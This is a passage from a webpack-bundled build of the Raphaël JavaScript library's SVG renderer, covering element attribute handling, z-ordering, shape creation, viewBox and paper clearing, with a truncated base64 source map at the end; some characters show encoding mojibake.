â`â¹angleâº-â¹colourâº[-â¹colourâº[:â¹offsetâº]]*-â¹colourâº`â, example: â`90-#fff-#000`â â 90Â°\n     * gradient from white to black or â`0-#fff-#f00:20-#000`â â 0Â° gradient from white via red (at 20%) to black.\n     *\n     * radial gradient: â`r[(â¹fxâº, â¹fyâº)]â¹colourâº[-â¹colourâº[:â¹offsetâº]]*-â¹colourâº`â, example: â`r#fff-#000`â â\n     * gradient from white to black or â`r(0.25, 0.75)#fff-#000`â â gradient from white to black with focus point\n     * at 0.25, 0.75. Focus point coordinates are in 0..1 range. Radial gradients can only be applied to circles and ellipses.\n     > Path String\n     # <p>Please refer to <a href="https://www.w3.org/TR/SVG/paths.html#PathData" title="Details of a pathâs data attributeâs format are described in the SVG specification.">SVG documentation regarding path string</a>. RaphaÃ«l fully supports it.</p>\n     > Colour Parsing\n     # <ul>\n     #     <li>Colour name (â<code>red</code>â, â<code>green</code>â, â<code>cornflowerblue</code>â, etc)</li>\n     #     <li>#â¢â¢â¢ â shortened HTML colour: (â<code>#000</code>â, â<code>#fc0</code>â, etc)</li>\n     #     <li>#â¢â¢â¢â¢â¢â¢ â full length HTML colour: (â<code>#000000</code>â, â<code>#bd2300</code>â)</li>\n     #     <li>rgb(â¢â¢â¢, â¢â¢â¢, â¢â¢â¢) â red, green and blue channelsâ values: (â<code>rgb(200,&nbsp;100,&nbsp;0)</code>â)</li>\n     #     <li>rgb(â¢â¢â¢%, â¢â¢â¢%, â¢â¢â¢%) â same as above, but in %: (â<code>rgb(100%,&nbsp;175%,&nbsp;0%)</code>â)</li>\n     #     <li>rgba(â¢â¢â¢, â¢â¢â¢, â¢â¢â¢, â¢â¢â¢) â red, green and blue channelsâ values: (â<code>rgba(200,&nbsp;100,&nbsp;0, .5)</code>â)</li>\n     #     <li>rgba(â¢â¢â¢%, â¢â¢â¢%, â¢â¢â¢%, â¢â¢â¢%) â same as above, but in %: (â<code>rgba(100%,&nbsp;175%,&nbsp;0%, 50%)</code>â)</li>\n     #     <li>hsb(â¢â¢â¢, â¢â¢â¢, â¢â¢â¢) â hue, saturation and brightness values: (â<code>hsb(0.5,&nbsp;0.25,&nbsp;1)</code>â)</li>\n     #     <li>hsb(â¢â¢â¢%, â¢â¢â¢%, â¢â¢â¢%) â same as above, but in %</li>\n     #     <li>hsba(â¢â¢â¢, â¢â¢â¢, â¢â¢â¢, â¢â¢â¢) â same as above, but with opacity</li>\n     #     <li>hsl(â¢â¢â¢, â¢â¢â¢, â¢â¢â¢) â almost the same as hsb, see <a href="https://en.wikipedia.org/wiki/HSL_and_HSV" title="HSL and HSV - Wikipedia, the free encyclopedia">Wikipedia page</a></li>\n     #     <li>hsl(â¢â¢â¢%, â¢â¢â¢%, â¢â¢â¢%) â same as above, but in %</li>\n     #     <li>hsla(â¢â¢â¢, â¢â¢â¢, â¢â¢â¢, â¢â¢â¢) â same as above, but with opacity</li>\n     #     <li>Optionally for hsb and hsl you could specify hue as a degree: â<code>hsl(240deg,&nbsp;1,&nbsp;.5)</code>â or, if you want to go fancy, â<code>hsl(240Â°,&nbsp;1,&nbsp;.5)</code>â</li>\n     # </ul>\n    \\*/\n    elproto.attr = function (name, value) {\n        if (this.removed) {\n            return this;\n        }\n        if (name == null) {\n            var res = {};\n            for (var a in this.attrs) if (this.attrs[has](a)) {\n                res[a] = this.attrs[a];\n            }\n            res.gradient && res.fill == "none" && (res.fill = res.gradient) && delete res.gradient;\n            res.transform = this._.transform;\n            return res;\n        }\n        if (value == null && R.is(name, "string")) {\n            if (name == "fill" && this.attrs.fill == "none" && this.attrs.gradient) {\n                return this.attrs.gradient;\n            }\n            if (name == "transform") {\n                return this._.transform;\n            }\n            var names = name.split(separator),\n                out = {};\n            for (var i = 0, ii = names.length; i < ii; i++) {\n                name = names[i];\n                if (name in this.attrs) {\n                    out[name] = this.attrs[name];\n                } else if (R.is(this.paper.customAttributes[name], "function")) {\n                    out[name] = this.paper.customAttributes[name].def;\n                } else {\n                    out[name] = R._availableAttrs[name];\n                }\n            }\n            return ii - 1 ? out : out[names[0]];\n        }\n        if (value == null && R.is(name, "array")) {\n            out = {};\n            for (i = 0, ii = name.length; i < ii; i++) {\n                out[name[i]] = this.attr(name[i]);\n            }\n            return out;\n        }\n        if (value != null) {\n            var params = {};\n            params[name] = value;\n        } else if (name != null && R.is(name, "object")) {\n            params = name;\n        }\n        for (var key in params) {\n            eve("raphael.attr." + key + "." + this.id, this, params[key]);\n        }\n        for (key in this.paper.customAttributes) if (this.paper.customAttributes[has](key) && params[has](key) && R.is(this.paper.customAttributes[key], "function")) {\n            var par = this.paper.customAttributes[key].apply(this, [].concat(params[key]));\n            this.attrs[key] = params[key];\n            for (var subkey in par) if (par[has](subkey)) {\n                params[subkey] = par[subkey];\n            }\n        }\n        setFillAndStroke(this, params);\n        return this;\n    };\n    /*\\\n     * Element.toFront\n     [ method ]\n     **\n     * Moves the element so it is the closest to the viewerâs eyes, on top of other elements.\n     = (object) @Element\n    \\*/\n    elproto.toFront = function () {\n        if (this.removed) {\n            return this;\n        }\n        var node = getRealNode(this.node);\n        node.parentNode.appendChild(node);\n        var svg = this.paper;\n        svg.top != this && R._tofront(this, svg);\n        return this;\n    };\n    /*\\\n     * Element.toBack\n     [ method ]\n     **\n     * Moves the element so it is the furthest from the viewerâs eyes, behind other elements.\n     = (object) @Element\n    \\*/\n    elproto.toBack = function () {\n        if (this.removed) {\n            return this;\n        }\n        var node = getRealNode(this.node);\n        var parentNode = node.parentNode;\n        parentNode.insertBefore(node, parentNode.firstChild);\n        R._toback(this, this.paper);\n        var svg = this.paper;\n        return this;\n    };\n    /*\\\n     * Element.insertAfter\n     [ method ]\n     **\n     * Inserts current object after the given one.\n     = (object) @Element\n    \\*/\n    elproto.insertAfter = function (element) {\n        if (this.removed || !element) {\n            return this;\n        }\n\n        var node = getRealNode(this.node);\n        var afterNode = getRealNode(element.node || element[element.length - 1].node);\n        if (afterNode.nextSibling) {\n            afterNode.parentNode.insertBefore(node, afterNode.nextSibling);\n        } else {\n            afterNode.parentNode.appendChild(node);\n        }\n        R._insertafter(this, element, this.paper);\n        return this;\n    };\n    /*\\\n     * Element.insertBefore\n     [ method ]\n     **\n     * Inserts current object before the given one.\n     = (object) @Element\n    \\*/\n    elproto.insertBefore = function (element) {\n        if (this.removed || !element) {\n            return this;\n        }\n\n        var node = getRealNode(this.node);\n        var beforeNode = getRealNode(element.node || element[0].node);\n        beforeNode.parentNode.insertBefore(node, beforeNode);\n        R._insertbefore(this, element, this.paper);\n        return this;\n    };\n    elproto.blur = function (size) {\n        // Experimental. No Safari support. Use it on your own risk.\n        var t = this;\n        if (+size !== 0) {\n            var fltr = $("filter"),\n                blur = $("feGaussianBlur");\n            t.attrs.blur = size;\n            fltr.id = R.createUUID();\n            $(blur, {stdDeviation: +size || 1.5});\n            fltr.appendChild(blur);\n            t.paper.defs.appendChild(fltr);\n            t._blur = fltr;\n            $(t.node, {filter: "url(#" + fltr.id + ")"});\n        } else {\n            if (t._blur) {\n                t._blur.parentNode.removeChild(t._blur);\n                delete t._blur;\n                delete t.attrs.blur;\n            }\n            t.node.removeAttribute("filter");\n        }\n        return t;\n    };\n    R._engine.circle = function (svg, x, y, r) {\n        var el = $("circle");\n        svg.canvas && svg.canvas.appendChild(el);\n        var res = new Element(el, svg);\n        res.attrs = {cx: x, cy: y, r: r, fill: "none", stroke: "#000"};\n        res.type = "circle";\n        $(el, res.attrs);\n        return res;\n    };\n    R._engine.rect = function (svg, x, y, w, h, r) {\n        var el = $("rect");\n        svg.canvas && svg.canvas.appendChild(el);\n        var res = new Element(el, svg);\n        res.attrs = {x: x, y: y, width: w, height: h, rx: r || 0, ry: r || 0, fill: "none", stroke: "#000"};\n        res.type = "rect";\n        $(el, res.attrs);\n        return res;\n    };\n    R._engine.ellipse = function (svg, x, y, rx, ry) {\n        var el = $("ellipse");\n        svg.canvas && svg.canvas.appendChild(el);\n        var res = new Element(el, svg);\n        res.attrs = {cx: x, cy: y, rx: rx, ry: ry, fill: "none", stroke: "#000"};\n        res.type = "ellipse";\n        $(el, res.attrs);\n        return res;\n    };\n    R._engine.image = function (svg, src, x, y, w, h) {\n        var el = $("image");\n        $(el, {x: x, y: y, width: w, height: h, preserveAspectRatio: "none"});\n        el.setAttributeNS(xlink, "href", src);\n        svg.canvas && svg.canvas.appendChild(el);\n        var res = new Element(el, svg);\n        res.attrs = {x: x, y: y, width: w, height: h, src: src};\n        res.type = "image";\n        return res;\n    };\n    R._engine.text = function (svg, x, y, text) {\n        var el = $("text");\n        svg.canvas && svg.canvas.appendChild(el);\n        var res = new Element(el, svg);\n        res.attrs = {\n            x: x,\n            y: y,\n            "text-anchor": "middle",\n            text: text,\n            "font-family": R._availableAttrs["font-family"],\n            "font-size": R._availableAttrs["font-size"],\n            stroke: "none",\n            fill: "#000"\n        };\n        res.type = "text";\n        setFillAndStroke(res, res.attrs);\n        return res;\n    };\n    R._engine.setSize = function (width, height) {\n        this.width = width || this.width;\n        this.height = height || this.height;\n        this.canvas.setAttribute("width", this.width);\n        this.canvas.setAttribute("height", this.height);\n        if (this._viewBox) {\n            this.setViewBox.apply(this, this._viewBox);\n        }\n        return this;\n    };\n    R._engine.create = function () {\n        var con = R._getContainer.apply(0, arguments),\n            container = con && con.container;\n        if (!container) {\n            throw new Error("SVG container not found.");\n        }\n        var x = con.x,\n            y = con.y,\n            width = con.width,\n            height = con.height,\n            cnvs = $("svg"),\n            css = "overflow:hidden;",\n            isFloating;\n        x = x || 0;\n        y = y || 0;\n        width = width || 512;\n        height = height || 342;\n        $(cnvs, {\n            height: height,\n            version: 1.1,\n            width: width,\n            xmlns: "https://www.w3.org/2000/svg",\n            "xmlns:xlink": "https://www.w3.org/1999/xlink"\n        });\n        if (container == 1) {\n            cnvs.style.cssText = css + "position:absolute;left:" + x + "px;top:" + y + "px";\n            R._g.doc.body.appendChild(cnvs);\n            isFloating = 1;\n        } else {\n            cnvs.style.cssText = css + "position:relative";\n            if (container.firstChild) {\n                container.insertBefore(cnvs, container.firstChild);\n            } else {\n                container.appendChild(cnvs);\n            }\n        }\n        container = new R._Paper;\n        container.width = width;\n        container.height = height;\n        container.canvas = cnvs;\n        container.clear();\n        container._left = container._top = 0;\n        isFloating && (container.renderfix = function () {});\n        container.renderfix();\n        return container;\n    };\n    R._engine.setViewBox = function (x, y, w, h, fit) {\n        eve("raphael.setViewBox", this, this._viewBox, [x, y, w, h, fit]);\n        var paperSize = this.getSize(),\n            size = mmax(w / paperSize.width, h / paperSize.height),\n            top = this.top,\n            aspectRatio = fit ? "xMidYMid meet" : "xMinYMin",\n            vb,\n            sw;\n        if (x == null) {\n            if (this._vbSize) {\n                size = 1;\n            }\n            delete this._vbSize;\n            vb = "0 0 " + this.width + S + this.height;\n        } else {\n            this._vbSize = size;\n            vb = x + S + y + S + w + S + h;\n        }\n        $(this.canvas, {\n            viewBox: vb,\n            preserveAspectRatio: aspectRatio\n        });\n        while (size && top) {\n            sw = "stroke-width" in top.attrs ? top.attrs["stroke-width"] : 1;\n            top.attr({"stroke-width": sw});\n            top._.dirty = 1;\n            top._.dirtyT = 1;\n            top = top.prev;\n        }\n        this._viewBox = [x, y, w, h, !!fit];\n        return this;\n    };\n    /*\\\n     * Paper.renderfix\n     [ method ]\n     **\n     * Fixes the issue of Firefox and IE9 regarding subpixel rendering. If paper is dependent\n     * on other elements after reflow it could shift half pixel which cause for lines to lost their crispness.\n     * This method fixes the issue.\n     **\n       Special thanks to Mariusz Nowak (https://www.medikoo.com/) for this method.\n    \\*/\n    R.prototype.renderfix = function () {\n        var cnvs = this.canvas,\n            s = cnvs.style,\n            pos;\n        try {\n            pos = cnvs.getScreenCTM() || cnvs.createSVGMatrix();\n        } catch (e) {\n            pos = cnvs.createSVGMatrix();\n        }\n        var left = -pos.e % 1,\n            top = -pos.f % 1;\n        if (left || top) {\n            if (left) {\n                this._left = (this._left + left) % 1;\n                s.left = this._left + "px";\n            }\n            if (top) {\n                this._top = (this._top + top) % 1;\n                s.top = this._top + "px";\n            }\n        }\n    };\n    /*\\\n     * Paper.clear\n     [ method ]\n     **\n     * Clears the paper, i.e. removes all the elements.\n    \\*/\n    R.prototype.clear = function () {\n        R.eve("raphael.clear", this);\n        var c = this.canvas;\n        while (c.firstChild) {\n            c.removeChild(c.firstChild);\n        }\n        this.bottom = this.top = null;\n        (this.desc = $("desc")).appendChild(R._g.doc.createTextNode("Created with Rapha\\xebl " + R.version));\n        c.appendChild(this.desc);\n        c.appendChild(this.defs = $("defs"));\n    };\n    /*\\\n     * Paper.remove\n     [ method ]\n     **\n     * Removes the paper from the DOM.\n    \\*/\n    R.prototype.remove = function () {\n        eve("raphael.remove", this);\n        this.canvas.parentNode && this.canvas.parentNode.removeChild(this.canvas);\n        for (var i in this) {\n            this[i] = typeof this[i] == "function" ? R._removedFactory(i) : null;\n        }\n    };\n    var setproto = R.st;\n    for (var method in elproto) if (elproto[has](method) && !setproto[has](method)) {\n        setproto[method] = (function (methodname) {\n            return function () {\n                var arg = arguments;\n                return this.forEach(function (el) {\n                    el[methodname].apply(el, arg);\n                });\n            };\n        })(method);\n    }\n}).apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__),\n\t\t\t\t__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiLi9kZXYvcmFwaGFlbC5zdmcuanMuanMiLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly9SYXBoYWVsLy4vZGV2L3JhcGhhZWwuc3ZnLmpzP2Q4YzciXSwic291cmNlc0NvbnRlbnQiOlsiZGVmaW5lKFtcIi4vcmFwaGFlbC5jb3JlXCJdLCBmdW5jdGlvbihSKSB7XG4gICAgaWYgKFIgJiYgIVIuc3ZnKSB7XG4gICAgICAgIHJldHVybjtcbiAgICB9XG5cbiAgICB2YXIgaGFzID0gXCJoYXNPd25Qcm9wZXJ0eVwiLFxuICAgICAgICBTdHIgPSBTdHJpbmcsXG4gICAgICAgIHRvRmxvYXQgPSBwYXJzZUZsb2F0LFxuICAgICAgICB0b0ludCA9IHBhcnNlSW50LFxuICAgICAgICBtYXRoID0gTWF0aCxcbiAgICAgICAgbW1heCA9IG1hdGgubWF4LFxuICAgICAgICBhYnMgPSBtYXRoLmFicyxcbiAgICAgICAgcG93ID0gbWF0aC5wb3csXG4gICAgICAgIHNlcGFyYXRvciA9IC9bLCBdKy8sXG4gICAgICAgIGV2ZSA9IFIuZXZlLFxuICAgICAgICBFID0gXCJcIixcbiAgICAgICAgUyA9IFwiIFwiO1xuICAgIHZhciB4bGluayA9IFwiaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGlua1wiLFxuICAgICAgICBtYXJrZXJzID0ge1xuICAgICAgICAgICAgYmxvY2s6IFwiTTUsMCAwLDIuNSA1LDV6XCIsXG4gICAgICAgICAgICBjbGFzc2ljOiBcIk01LDAgMCwyLjUgNSw1IDMuNSwzIDMuNSwyelwiLFxuICAgICAgICAgICAgZGlhbW9uZDogXCJNMi41LDAgNSwyLjUgMi41LDUgMCwyLjV6XCIsXG4gICAgICAgICAgICBvcGVuOiBcIk02LDEgMSwzLjUgNiw2XCIsXG4gICAgICAgICAgICBvdmFsOiBcIk0yLjUsMEEyLjUsMi41LDAsMCwxLDIuNSw1IDIuNSwyLjUsMCwwLDEsMi41LDB6XCJcbiAgICAgICAgfSxcbiAgICAgICAgbWFya2VyQ291bnRlciA9IHt9O1xuICAgIFIudG9TdHJpbmcgPSBmdW5jdGlvbiAoKSB7XG4gICAgICAgIHJldHVybiAgXCJZb3VyIGJyb3dzZXIgc3VwcG9ydHMgU1ZHLlxcbllvdSBhcmUgcnVubmluZyBSYXBoYVxceGVibCBcIiArIHRoaXMudmVyc2lvbjtcbiAgICB9O1xuICAgIHZhciAkID0gZnVuY3Rpb24gKGVsLCBhdHRyKSB7XG4gICAgICAgIGlmIChhdHRyKSB7XG4gICAgICAgICAgICBpZiAodHlwZW9mIGVsID09IFwic3RyaW5nXCIpIHtcbiAgICAgICAgICAgICAgICBlbCA9ICQoZWwpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgZm9yICh2YXIga2V5IGluIGF0dHIpIGlmIChhdHRyW2hhc10oa2V5KSkge1xuICAgICAgICAgICAgICAgIGlmIChrZXkuc3Vic3RyaW5nKDAsIDYpID09IFwieGxpbms6XCIpIHtcbiAgICAgICAgICAgICAgICAgICAgZWwuc2V0QXR0cmlidXRlTlMoeGxpbmssIGtleS5zdWJzdHJpbmcoNiksIFN0cihhdHRyW2tleV0pKTtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBlbC5zZXRBdHRyaWJ1dGUoa2V5LCBTdHIoYXR0cltrZXldKSk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgZWwgPSBSLl9nLmRvYy5jcmVhdGVFbGVtZW50TlMoXCJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2Z1wiLCBlbCk7XG4gICAgICAgICAgICBlbC5zdHlsZSAmJiAoZWwuc3R5bGUud2Via2l0VGFwSGlnaGxpZ2h0Q29sb3IgPSBcInJnYmEoMCwwLDAsMClcIik7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIGVsO1xuICAgIH0sXG4gICAgYWRkR3JhZGllbnRGaWxsID0gZnVuY3Rpb24gKGVsZW1lbnQsIGdyYWRpZW50KSB7XG4gICAgICAgIHZhciB0eXBlID0gXCJsaW5lYXJcIixcbiAgICAgICAgICAgIGlkID0gZWxlbWVudC5pZCArIGdyYWRpZW50LFxuICAgICAgICAgICAgZnggPSAuNSwgZnkgPSAuNSxcbiAgICAgICAgICAgIG8gPSBlbGVtZW50Lm5vZGUsXG4gICAgICAgICAgICBTVkcgPSBlbGVtZW50LnBhcGVyLFxuICAgICAgICAgICAgcyA9IG8uc3R5bGUsXG4gICAgICAgICAgICBlbCA9IFIuX2cuZG9jLmdldEVsZW1lbnRCeUlkKGlkKTtcbiAgICAgICAgaWYgKCFlbCkge1xuICAgICAgICAgICAgZ3JhZGllbnQgPSBTdHIoZ3JhZGllbnQpLnJlcGxhY2UoUi5fcmFkaWFsX2dyYWRpZW50LCBmdW5jdGlvbiAoYWxsLCBfZngsIF9meSkge1xuICAgICAgICAgICAgICAgIHR5cGUgPSBcInJhZGlhbFwiO1xuICAgICAgICAgICAgICAgIGlmIChfZnggJiYgX2Z5KSB7XG4gICAgICAgICAgICAgICAgICAgIGZ4ID0gdG9GbG9hdChfZngpO1xuICAgICAgICAgICAgICAgICAgICBmeSA9IHRvRmxvYXQoX2Z5KTtcbiAgICAgICAgICAgICAgICAgICAgdmFyIGRpciA9ICgoZnkgPiAuNSkgKiAyIC0gMSk7XG4gICAgICAgICAgICAgICAgICAgIHBvdyhmeCAtIC41LCAyKSArIHBvdyhmeSAtIC41LCAyKSA+IC4yNSAmJlxuICAgICAgICAgICAgICAgICAgICAgICAgKGZ5ID0gbWF0aC5zcXJ0KC4yNSAtIHBvdyhmeCAtIC41LCAyKSkgKiBkaXIgKyAuNSkgJiZcbiAgICAgICAgICAgICAgICAgICAgICAgIGZ5ICE9IC41ICYmXG4gICAgICAgICAgICAgICAgICAgICAgICAoZnkgPSBmeS50b0ZpeGVkKDUpIC0gMWUtNSAqIGRpcik7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIHJldHVybiBFO1xuICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICBncmFkaWVudCA9IGdyYWRpZW50LnNwbGl0KC9cXHMqXFwtXFxzKi8pO1xuICAgICAgICAgICAgaWYgKHR5cGUgPT0gXCJsaW5lYXJcIikge1xuICAgICAgICAgICAgICAgIHZhciBhbmdsZSA9IGdyYWRpZW50LnNoaWZ0KCk7XG4gICAgICAgICAgICAgICAgYW5nbGUgPSAtdG9GbG9hdChhbmdsZSk7XG4gICAgICAgICAgICAgICAgaWYgKGlzTmFOKGFuZ2xlKSkge1xuICAgICAgICAgICAgICAgICAgICByZXR1cm4gbnVsbDtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgdmFyIHZlY3RvciA9IFswLCAwLCBtYXRoLmNvcyhSLnJhZChhbmdsZSkpLCBtYXRoLnNpbihSLnJhZChhbmdsZSkpXSxcbiAgICAgICAgICAgICAgICAgICAgbWF4ID0gMSAvIChtbWF4KGFicyh2ZWN0b3JbMl0pLCBhYnModmVjdG9yWzNdKSkgfHwgMSk7XG4gICAgICAgICAgICAgICAgdmVjdG9yWzJdICo9IG1heDtcbiAgICAgICAgICAgICAgICB2ZWN0b3JbM10gKj0gbWF4O1xuICAgICAgICAgICAgICAgIGlmICh2ZWN0b3JbMl0gPCAwKSB7XG4gICAgICAgICAgICAgICAgICAgIHZlY3RvclswXSA9IC12ZWN0b3JbMl07XG4gICAgICAgICAgICAgICAgICAgIHZlY3RvclsyXSA9IDA7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGlmICh2ZWN0b3JbM10gPCAwKSB7XG4gICAgICAgICAgICAgICAgICAgIHZlY3RvclsxXSA9IC12ZWN0b3JbM107XG4gICAgICAgICAgICAgICAgICAgIHZlY3RvclszXSA9IDA7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdmFyIGRvdHMgPSBSLl9wYXJzZURvdHMoZ3JhZGllbnQpO1xuICAgICAgICAgICAgaWYgKCFkb3RzKSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuIG51bGw7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZCA9IGlkLnJlcGxhY2UoL1tcXChcXClcXHMsXFx4YjAjXS9nLCBcIl9cIik7XG5cbiAgICAgICAgICAgIGlmIChlbGVtZW50LmdyYWRpZW50ICYmIGlkICE9IGVsZW1lbnQuZ3JhZGllbnQuaWQpIHtcbiAgICAgICAgICAgICAgICBTVkcuZGVmcy5yZW1vdmVDaGlsZChlbGVtZW50LmdyYWRpZW50KTtcbiAgICAgICAgICAgICAgICBkZWxldGUgZWxlbWVudC5ncmFkaWVudDtcbiAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgaWYgKCFlbGVtZW50LmdyYWRpZW50KSB7XG4gICAgICAgICAgICAgICAgZWwgPSAkKHR5cGUgKyBcIkdyYWRpZW50XCIsIHtpZDogaWR9KTtcbiAgICAgICAgICAgICAgICBlbGVtZW50LmdyYWRpZW50ID0gZWw7XG4gICAgICAgICAgICAgICAgJChlbCwgdHlwZSA9PSBcInJhZGlhbFwiID8ge1xuICAgICAgICAgICAgICAgICAgICBmeDogZngsXG4gICAgICAgICAgICAgICAgICAgIGZ5OiBmeVxuICAgICAgICAgICAgICAgIH0gOiB7XG4gICAgICAgICAgICAgICAgICAgIHgxOiB2ZWN0b3JbMF0sXG4gICAgICAgICAgICAgICAgICAgIHkxOiB2ZWN0b3JbMV0sXG4gICAgICAgICAgICAgICAgICAgIHgyOiB2ZWN0b3JbMl0sXG4gICAgICAgICAgICAgICAgICAgIHkyOiB2ZWN0b3JbM10sXG4gICAgICAgICAgICAgICAgICAgIGdyYWRpZW50VHJhbnNmb3JtOiBlbGVtZW50Lm1hdHJpeC5pbnZlcnQoKVxuICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgIFNWRy5kZWZzLmFwcGVuZENoaWxkKGVsKTtcbiAgICAgICAgICAgICAgICBmb3IgKHZhciBpID0gMCwgaWkgPSBkb3RzLmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICAgICAgZWwuYXBwZW5kQ2hpbGQoJChcInN0b3BcIiwge1xuICAgICAgICAgICAgICAgICAgICAgICAgb2Zmc2V0OiBkb3RzW2ldLm9mZnNldCA/IGRvdHNbaV0ub2Zmc2V0IDogaSA/IFwiMTAwJVwiIDogXCIwJVwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgXCJzdG9wLWNvbG9yXCI6IGRvdHNbaV0uY29sb3IgfHwgXCIjZmZmXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICBcInN0b3Atb3BhY2l0eVwiOiBpc0Zpbml0ZShkb3RzW2ldLm9wYWNpdHkpID8gZG90c1tpXS5vcGFjaXR5IDogMVxuICAgICAgICAgICAgICAgICAgICB9KSk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgICQobywge1xuICAgICAgICAgICAgZmlsbDogZmlsbHVybChpZCksXG4gICAgICAgICAgICBvcGFjaXR5OiAxLFxuICAgICAgICAgICAgXCJmaWxsLW9wYWNpdHlcIjogMVxuICAgICAgICB9KTtcbiAgICAgICAgcy5maWxsID0gRTtcbiAgICAgICAgcy5vcGFjaXR5ID0gMTtcbiAgICAgICAgcy5maWxsT3BhY2l0eSA9IDE7XG4gICAgICAgIHJldHVybiAxO1xuICAgIH0sXG4gICAgaXNJRTlvcjEwID0gZnVuY3Rpb24gKCkge1xuICAgICAgdmFyIG1vZGUgPSBkb2N1bWVudC5kb2N1bWVudE1vZGU7XG4gICAgICByZXR1cm4gbW9kZSAmJiAobW9kZSA9PT0gOSB8fCBtb2RlID09PSAxMCk7XG4gICAgfSxcbiAgICBmaWxsdXJsID0gZnVuY3Rpb24gKGlkKSB7XG4gICAgICBpZiAoaXNJRTlvcjEwKCkpIHtcbiAgICAgICAgICByZXR1cm4gXCJ1cmwoJyNcIiArIGlkICsgXCInKVwiO1xuICAgICAgfVxuICAgICAgdmFyIGxvY2F0aW9uID0gZG9jdW1lbnQubG9jYXRpb247XG4gICAgICB2YXIgbG9jYXRpb25TdHJpbmcgPSAoXG4gICAgICAgICAgbG9jYXRpb24ucHJvdG9jb2wgKyAnLy8nICtcbiAgICAgICAgICBsb2NhdGlvbi5ob3N0ICtcbiAgICAgICAgICBsb2NhdGlvbi5wYXRobmFtZSArXG4gICAgICAgICAgbG9jYXRpb24uc2VhcmNoXG4gICAgICApO1xuICAgICAgcmV0dXJuIFwidXJsKCdcIiArIGxvY2F0aW9uU3RyaW5nICsgXCIjXCIgKyBpZCArIFwiJylcIjtcbiAgICB9LFxuICAgIHVwZGF0ZVBvc2l0aW9uID0gZnVuY3Rpb24gKG8pIHtcbiAgICAgICAgdmFyIGJib3ggPSBvLmdldEJCb3goMSk7XG4gICAgICAgICQoby5wYXR0ZXJuLCB7cGF0dGVyblRyYW5zZm9ybTogby5tYXRyaXguaW52ZXJ0KCkgKyBcIiB0cmFuc2xhdGUoXCIgKyBiYm94LnggKyBcIixcIiArIGJib3gueSArIFwiKVwifSk7XG4gICAgfSxcbiAgICBhZGRBcnJvdyA9IGZ1bmN0aW9uIChvLCB2YWx1ZSwgaXNFbmQpIHtcbiAgICAgICAgaWYgKG8udHlwZSA9PSBcInBhdGhcIikge1xuICAgICAgICAgICAgdmFyIHZhbHVlcyA9IFN0cih2YWx1ZSkudG9Mb3dlckNhc2UoKS5zcGxpdChcIi1cIiksXG4gICAgICAgICAgICAgICAgcCA9IG8ucGFwZXIsXG4gICAgICAgICAgICAgICAgc2UgPSBpc0VuZCA/IFwiZW5kXCIgOiBcInN0YXJ0XCIsXG4gICAgICAgICAgICAgICAgbm9kZSA9IG8ubm9kZSxcbiAgICAgICAgICAgICAgICBhdHRycyA9IG8uYXR0cnMsXG4gICAgICAgICAgICAgICAgc3Ryb2tlID0gYXR0cnNbXCJzdHJva2Utd2lkdGhcIl0sXG4gICAgICAgICAgICAgICAgaSA9IHZhbHVlcy5sZW5ndGgsXG4gICAgICAgICAgICAgICAgdHlwZSA9IFwiY2xhc3NpY1wiLFxuICAgICAgICAgICAgICAgIGZyb20sXG4gICAgICAgICAgICAgICAgdG8sXG4gICAgICAgICAgICAgICAgZHgsXG4gICAgICAgICAgICAgICAgcmVmWCxcbiAgICAgICAgICAgICAgICBhdHRyLFxuICAgICAgICAgICAgICAgIHcgPSAzLFxuICAgICAgICAgICAgICAgIGggPSAzLFxuICAgICAgICAgICAgICAgIHQgPSA1O1xuICAgICAgICAgICAgd2hpbGUgKGktLSkge1xuICAgICAgICAgICAgICAgIHN3aXRjaCAodmFsdWVzW2ldKSB7XG4gICAgICAgICAgICAgICAgICAgIGNhc2UgXCJibG9ja1wiOlxuICAgICAgICAgICAgICAgICAgICBjYXNlIFwiY2xhc3NpY1wiOlxuICAgICAgICAgICAgICAgICAgICBjYXNlIFwib3ZhbFwiOlxuICAgICAgICAgICAgICAgICAgICBjYXNlIFwiZGlhbW9uZFwiOlxuICAgICAgICAgICAgICAgICAgICBjYXNlIFwib3BlblwiOlxuICAgICAgICAgICAgICAgICAgICBjYXNlIFwibm9uZVwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgdHlwZSA9IHZhbHVlc1tpXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICBjYXNlIFwid2lkZVwiOiBoID0gNTsgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIGNhc2UgXCJuYXJyb3dcIjogaCA9IDI7IGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICBjYXNlIFwibG9uZ1wiOiB3ID0gNTsgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIGNhc2UgXCJzaG9ydFwiOiB3ID0gMjsgYnJlYWs7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgaWYgKHR5cGUgPT0